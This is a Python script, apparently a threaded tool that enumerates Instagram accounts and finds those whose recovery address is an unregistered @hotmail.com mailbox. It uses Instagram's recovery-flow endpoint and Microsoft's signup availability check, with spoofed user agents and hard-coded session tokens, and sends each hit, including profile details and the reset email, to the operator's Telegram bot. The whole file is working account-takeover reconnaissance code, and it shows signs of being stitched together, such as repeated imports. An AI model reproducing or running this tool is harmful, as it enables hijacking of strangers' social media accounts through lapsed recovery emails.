
import os
import time
import json
import uuid
import random
import hashlib
import re
import threading
import sys
import string
from datetime import datetime
from random import choice, randrange
import requests
from requests import post as pp
from user_agent import generate_user_agent
from cfonts import render
from colorama import Fore, Style, init

init(autoreset=True)

total_hits = hits = bad_insta = bad_email = good_ig = 0
infoinsta = {}
session = requests.Session()

API_CONFIG = {
    "instagram_recovery_url": "https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/",
    "ig_sig_key_version": "ig_sig_key_version",
    "signed_body": "signed_body",
    "cookie_value": "mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj",
    "content_type_header": "Content-Type",
    "cookie_header": "Cookie",
    "user_agent_header": "User-Agent",
    "default_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "google_accounts_url": "https://accounts.google.com",
    "google_accounts_domain": "accounts.google.com",
    "referrer_header": "referer",
    "origin_header": "origin",
    "authority_header": "authority",
    "content_type_form": "application/x-www-form-urlencoded; charset=UTF-8",
    "content_type_form_alt": "application/x-www-form-urlencoded;charset=UTF-8",
    "token_file": "wasu_token.txt",
    "wasu_domain": "@hotmail.com"
}
import os
import random
from cfonts import render

COLORS = {
    'BLUE': '\033[94m', 'RESET': '\033[0m', 'BOLD': '\033[1m', 'YELLOW': '\033[93m',
    'RED': '\033[91m', 'GREEN': '\033[92m', 'CYAN': '\033[96m', 'MAGENTA': '\033[95m',
    'E': '\033[1;31m', 'M': '\x1b[1;37m', 'HH': '\033[1;34m', 'R': '\033[1;31;40m',
    'F': '\033[1;32;40m', 'C': "\033[1;97;40m", 'B': '\033[1;36;40m', 'G': '\033[1;34m'
}

ANSI_COLORS = {
    "black": "\033[30m",
    "red": "\033[31m",
    "green": "\033[32m",
    "yellow": "\033[33m",
    "blue": "\033[34m",
    "magenta": "\033[35m",
    "cyan": "\033[36m",
    "white": "\033[37m",
    "reset": "\033[0m"
}

def rand_color():
    return f'\x1b[38;5;{random.randint(16, 231)}m'

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def display_banner():
    clear_screen()
    COLOR_COMBOS = [
        ['green', 'yellow'],
        ['magenta', 'red'],
        ['blue', 'cyan'],
        ['white', 'gray'],
        ['red', 'magenta'],
        ['yellow', 'green']
    ]
    wasu_colors, qe_colors = random.sample(COLOR_COMBOS, 2)
    WASU = render('BAYMAX!', colors=wasu_colors, align='center', font='block')
    print(WASU)
import os
import random

ANSI_COLORS = {
    "reset": "\033[0m",
    "red": "\033[31m",
    "magenta": "\033[35m",
    "blue": "\033[34m",
    "cyan": "\033[36m",
    "white": "\033[37m",
    "yellow": "\033[33m",
    "green": "\033[32m"
}

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

RANGES = {
    1:  ((1279001, 17750000), "2011"),
    2:  ((17750000, 279760000), "2012"),
    3:  ((279760000, 900990000), "2013"),
    4:  ((900990000, 1629010000), "2014"),
    5:  ((1629010000, 2500000000), "2015"),
    6:  ((2500000000, 3713668786), "2016"),
    7:  ((3713668786, 5699785217), "2017"),
    8:  ((5699785217, 8507940634), "2018"),
    9:  ((8507940634, 21254029834), "2019"),
    10: ((17750000, 900990000), "2012–2013"),
    11: ((900990000, 21254029834), "2014–2019"),
    12: ((1629010000, 2500000000), "2015–2016"),
}

def get_user_inputs():
    COLOR_COMBOS = [
        ['red', 'magenta'],
        ['blue', 'cyan'],
        ['white', 'yellow'],
        ['green', 'blue'],
        ['magenta', 'red'],
        ['cyan', 'green']
    ]
    colorrandoms = random.choice(COLOR_COMBOS)
    main_color, accent_color = colorrandoms

    term_width = os.get_terminal_size().columns

    print(ANSI_COLORS[main_color] + "BIZZ + META FILE".center(term_width) + ANSI_COLORS["reset"])
    print()

    TOKEN = input(ANSI_COLORS[accent_color] + "Enter Your Tele Token : " + ANSI_COLORS["reset"])
    print()
    ID = input(ANSI_COLORS[accent_color] + "Enter Your User ID    : " + ANSI_COLORS["reset"])
    print()

    print(ANSI_COLORS[accent_color] + "\nSelect Year Range:" + ANSI_COLORS["reset"])
    for key, (_, label) in RANGES.items():
        print(f"  {ANSI_COLORS['white']}{key}. {label}{ANSI_COLORS['reset']}")
    print(f"  {ANSI_COLORS['white']}0. Custom Range (enter manually){ANSI_COLORS['reset']}\n")

    choice = input(ANSI_COLORS[accent_color] + "Enter your choice (number): " + ANSI_COLORS["reset"]).strip()

    if choice.isdigit():
        choice = int(choice)
        if choice in RANGES:
            range_tuple = RANGES[choice][0]
        elif choice == 0:
            try:
                start = int(input(ANSI_COLORS[accent_color] + "Enter custom start ID: " + ANSI_COLORS["reset"]))
                end = int(input(ANSI_COLORS[accent_color] + "Enter custom end ID  : " + ANSI_COLORS["reset"]))
                range_tuple = (start, end)
            except ValueError:
                print(ANSI_COLORS["red"] + "Invalid input! Using default range." + ANSI_COLORS["reset"])
                range_tuple = (10000, 21254029834)
        else:
            range_tuple = (10000, 21254029834)
    else:
        range_tuple = (10000, 21254029834)

    print()
    min_followers_input = input(ANSI_COLORS[accent_color] + "Minimum Followers (default 0): " + ANSI_COLORS["reset"])
    min_followers = int(min_followers_input) if min_followers_input.strip().isdigit() else 0

    min_posts_input = input(ANSI_COLORS[accent_color] + "Minimum Posts (default 0): " + ANSI_COLORS["reset"])
    min_posts = int(min_posts_input) if min_posts_input.strip().isdigit() else 0

    clear_screen()
    return ID, TOKEN, range_tuple, min_followers, min_posts


    clear_screen()
    return ID, TOKEN, range_tuple, min_followers, min_posts

def safe_int_input(prompt, default):
    try:
        value = input(prompt).strip()
        return int(value) if value else default
    except:
        return default

def generate_user_id(range_tuple):
    start, end = range_tuple
    return str(random.randrange(start, end))
def display_stats():
    global hits, bad_insta, bad_email, good_ig
    clear_screen()
    output = (
   
        f"  Hits    :   {hits} \n"
        f"  Bad     :   {bad_insta} \n"
        f"  Good    :   {good_ig} \n"
   
     )
    print(output)

def update_stats():
    display_stats()

def cookie(email):
    versions = ["13.1.2", "13.1.1", "13.0.5", "12.1.2", "12.0.3"]
    oss = [
    "Macintosh; Intel Mac OS X 10_15_7",
     "Macintosh; Intel Mac OS X 10_14_6",
      "iPhone; CPU iPhone OS 14_0 like Mac OS X",
       "iPhone; CPU iPhone OS 13_6 like Mac OS X"]
    version = random.choice(versions)
    platform = random.choice(oss)
    user_agent = f"Mozilla/5.0 ({platform}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{version} Safari/605.1.15 Edg/122.0.0.0"
    try:
        url = 'https://signup.live.com'
        headers={'user-agent': user_agent}
        response = requests.post(url,headers=headers)
        amsc = response.cookies.get_dict()['amsc']
        match = re.search(r'"apiCanary":"(.*?)"', response.text)
        if match:
            api_canary= match.group(1)
            canary = api_canary.encode().decode('unicode_escape')
        else:
            canary = ""
        return amsc,canary
    except:
        return None, None

def check_hotmail(email):
    global bad_email, hits
    try:
        versions = ["13.1.2", "13.1.1", "13.0.5", "12.1.2", "12.0.3"]
        oss = [
        "Macintosh; Intel Mac OS X 10_15_7",
         "Macintosh; Intel Mac OS X 10_14_6",
          "iPhone; CPU iPhone OS 14_0 like Mac OS X",
           "iPhone; CPU iPhone OS 13_6 like Mac OS X"]
        version = random.choice(versions)
        platform = random.choice(oss)
        user_agent = f"Mozilla/5.0 ({platform}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{version} Safari/605.1.15 Edg/122.0.0.0"
             
        amsc, canary = cookie(email)
        if not amsc:
            return False, None
             
        headers = {
            'authority': 'signup.live.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'canary': canary,
            'user-agent': user_agent,
        }
        
        cookies = {
            'amsc': amsc
        }
        
        data = {
            'signInName': email + "@hotmail.com",
        }
        
        response = requests.post(
            'https://signup.live.com/API/CheckAvailableSigninNames',
            cookies=cookies,
            headers=headers,
            json=data
        )   
        
        if 'isAvailable' in response.text and '"isAvailable":true' in response.text:
            hits += 1
            update_stats()
            full_email = email + API_CONFIG["wasu_domain"]
            return True, full_email
        else:
            bad_email += 1
            update_stats()
            return False, None
            
    except Exception as e:
        print("Hotmail check error:", e)
        return False, None

def check_instagram(email):
    global good_ig, bad_insta
    
    ua = generate_user_agent()
    dev = 'android-'
    device_id = dev + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
    uui = str(uuid.uuid4())
    
    headers = {
        API_CONFIG["user_agent_header"]: ua,
        API_CONFIG["cookie_header"]: API_CONFIG["cookie_value"],
        API_CONFIG["content_type_header"]: API_CONFIG["content_type_form"]
    }
    
    data = {
        API_CONFIG["signed_body"]: (
            '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' +
            json.dumps({
                '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
                'adid': uui,
                'guid': uui,
                'device_id': device_id,
                'query': email
            })
        ),
        API_CONFIG["ig_sig_key_version"]: '4'
    }
    
    response = session.post(API_CONFIG["instagram_recovery_url"], headers=headers, data=data).text
    
    if email in response:
        good_ig += 1
        update_stats()
        return True
    else:
        bad_insta += 1
        update_stats()
        return False

def get_reset_email(user):
    try:
        headers = {
            'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
            'X-Pigeon-Rawclienttime': '1700251574.982',
            'X-IG-Connection-Speed': '-1kbps',
            'X-IG-Bandwidth-Speed-KBPS': '-1.000',
            'X-IG-Bandwidth-TotalBytes-B': '0',
            'X-IG-Bandwidth-TotalTime-MS': '0',
            'X-Bloks-Version-Id': 'c80c5fb30dfae9e273e4009f03b18280bb343b0862d663f31a3c63f13a9f31c0',
            'X-IG-Connection-Type': 'WIFI',
            'X-IG-Capabilities': '3brTvw==',
            'X-IG-App-ID': '567067343352427',
            API_CONFIG["user_agent_header"]: 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
            'Accept-Language': 'en-GB, en-US',
            API_CONFIG["cookie_header"]: API_CONFIG["cookie_value"],
            API_CONFIG["content_type_header"]: API_CONFIG["content_type_form"],
            'Accept-Encoding': 'gzip, deflate',
            'Host': 'i.instagram.com',
            'X-FB-HTTP-Engine': 'Liger',
            'Connection': 'keep-alive',
            'Content-Length': '356'
        }
        
        data = {
            API_CONFIG["signed_body"]: (
                '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' +
                '{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj",'
                '"adid":"0dfaf820-2748-4634-9365-c3d8c8011256",'
                '"guid":"1f784431-2663-4db9-b624-86bd9ce1d084",'
                '"device_id":"android-b93ddb37e983481c",'
                '"query":"' + user + '"}'
            ),
            API_CONFIG["ig_sig_key_version"]: '4'
        }
        
        response = session.post(API_CONFIG["instagram_recovery_url"], headers=headers, data=data).json()
        return response.get('email', 'No reset email found')
        
    except Exception as e:
        print("Reset email error:", e)
        return 'Error fetching reset email'

def get_registration_year(user_id):
    try:
        uid = int(user_id)
        if 1 < uid <= 1278889:
            return 2010
        elif 1279000 <= uid <= 17750000:
            return 2011
        elif 17750001 <= uid <= 279760000:
            return 2012
        elif 279760001 <= uid <= 900990000:
            return 2013
        elif 900990001 <= uid <= 1629010000:
            return 2014
        elif 1629010001 <= uid <= 2369359761:
            return 2015
        elif 2369359762 <= uid <= 4239516754:
            return 2016
        elif 4239516755 <= uid <= 6345108209:
            return 2017
        elif 6345108210 <= uid <= 10016232395:
            return 2018
        elif 10016232396 <= uid <= 27238602159:
            return 2019
        elif 27238602160 <= uid <= 43464475395:
            return 2020
        elif 43464475396 <= uid <= 50289297647:
            return 2021
        elif 50289297648 <= uid <= 57464707082:
            return 2022
        elif 57464707083 <= uid <= 63313426938:
            return 2023
        else:
            return "2024 or 2025"
    except:
        return "Unknown"

def InfoAcc(username, domain, TOKEN, ID):
    global total_hits
    account_info = infoinsta.get(username, {})
    
    # Extract Instagram data safely
    user_id = account_info.get('pk', 0)
    full_name = account_info.get('full_name', '')
    followers = account_info.get('follower_count', 0)
    following = account_info.get('following_count', 0)
    posts = account_info.get('media_count', 0)
    bio = account_info.get('biography', '')
    is_private = account_info.get('is_private', False)
    is_verified = account_info.get('is_verified', False)
    is_business = account_info.get('is_business', False)
    
    reg_date = get_registration_year(user_id)

    meta = followers >= 10

    total_hits += 1

    reset_email = get_reset_email(username)
    email = f"{username}@{domain}"

    info_text = f"""
●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●
🌪️NAME        : {full_name}
⚡USERNAME    : @{username}
🌀EMAIL       : {email}
🌪️FOLLOWERS  : {followers}
⚡FOLLOWING   : {following}
🌀POSTS       : {posts}
🌪️BIO         : {bio}
⚡PRIVATE     : {is_private}
🌀ID          : {user_id}
🌪️YEAR        : {reg_date}
⚡META        : {meta}
🌀LINK        : https://www.instagram.com/{username}
🌪️RESET       : {reset_email}
●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●
"""
    
    with open('hotmail.txt', 'a', encoding='utf-8') as f:
        f.write(info_text + "\n\n")

    try:
        inline_keyboard = [[
            {'text': 'Join Channel', 'url': 'https://t.me/ukwuf'}
        ]]

        payload = {
            'chat_id': ID,
            'text': info_text,
            'parse_mode': 'HTML',
            'reply_markup': json.dumps({'inline_keyboard': inline_keyboard})
        }

        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", data=payload)

    except Exception as e:
        print("⚠️ Telegram Send Error:", e)

    return info_text


def scrape_instagram_data(range_tuple, min_followers, min_posts, TOKEN, ID):
    while True:
        try:
            user_id = generate_user_id(range_tuple)
            model_number = str(random.randint(150, 999))
            android_version = random.choice(['23/6.0', '24/7.0', '25/7.1.1', '26/8.0', '27/8.1', '28/9.0'])
            dpi = str(random.randint(100, 1300))
            resolution = f"{random.randint(200, 2000)}x{random.randint(200, 2000)}"
            brand = random.choice(['SAMSUNG', 'HUAWEI', 'LGE/lge', 'HTC', 'ASUS', 'ZTE', 'ONEPLUS', 'XIAOMI', 'OPPO', 'VIVO', 'SONY', 'REALME'])
            build_suffix = str(random.randint(111, 999))
            
            user_agent = (
                f"Instagram 311.0.0.32.118 Android ({android_version}; {dpi}dpi; "
                f"{resolution}; {brand}; SM-T{model_number}; SM-T{model_number}; qcom; en_US; 545986{build_suffix})"
            )
            lsd_token = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
            
            headers = {
                'accept': '*/*',
                'accept-language': 'en,en-US;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'dnt': '1',
                'origin': 'https://www.instagram.com',
                'priority': 'u=1, i',
                'referer': 'https://www.instagram.com/cristiano/following/',
                'user-agent': user_agent,
                'x-fb-friendly-name': 'PolarisUserHoverCardContentV2Query',
                'x-fb-lsd': lsd_token,
            }
            
            data = {
                'lsd': lsd_token,
                'fb_api_caller_class': 'RelayModern',
                'fb_api_req_friendly_name': 'PolarisUserHoverCardContentV2Query',
                'variables': json.dumps({'userID': user_id, 'username': 'cristiano'}),
                'server_timestamps': 'true',
                'doc_id': '7717269488336001',
            }
            
            response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
            user_info = response.json().get('data', {}).get('user', {})
            username = user_info.get('username', '')
            
            if username and '_' not in username:
                infoinsta[username] = user_info
                follower_count = int(user_info.get('follower_count', 0))
                media_count = int(user_info.get('media_count', 0))
                
                if follower_count >= min_followers and media_count >= min_posts:
                    email = f"{username}{API_CONFIG['wasu_domain']}"
                    
                    is_valid_instagram = check_instagram(email)
                    
                    if is_valid_instagram:
                        is_valid_hotmail, full_email = check_hotmail(username)
                        
                        if is_valid_hotmail:
                            InfoAcc(username, API_CONFIG['wasu_domain'].replace('@', ''), TOKEN, ID)

        except Exception as e:
            pass

def stats_loop():
    while True:
        update_stats()
        time.sleep(2)

def main():
    display_banner()
    
    ID, TOKEN, selected_range, min_followers, min_posts = get_user_inputs()
    
    print("tool starting...")
    
    stats_thread = threading.Thread(target=stats_loop, daemon=True)
    stats_thread.start()
    
    print("Tool is now running...")
    
    threads = []
    for _ in range(100):
        thread = threading.Thread(target=scrape_instagram_data, args=(selected_range, min_followers, min_posts, TOKEN, ID), daemon=True)
        thread.start()
        threads.append(thread)
    #wasupy
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nTool stopped by user.")

if __name__ == "__main__":
    main()